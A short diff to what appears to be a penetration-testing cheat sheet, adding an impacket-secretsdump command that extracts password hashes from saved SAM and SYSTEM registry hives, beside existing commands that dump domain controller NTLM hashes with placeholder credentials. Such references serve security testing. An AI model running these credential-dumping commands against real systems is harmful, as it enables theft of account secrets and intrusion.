@@ -78,4 +78,7 @@ impacket-secretsdump -just-dc example.local/username:password@10.0.0.1
 
 # Only NTLM hashes
 impacket-secretsdump -just-dc-ntlm example.local/username:password@10.0.0.1
+
+# SAM and SYSTEM
+impacket-secretsdump -sam sam.bak -system system.bak local
 ```
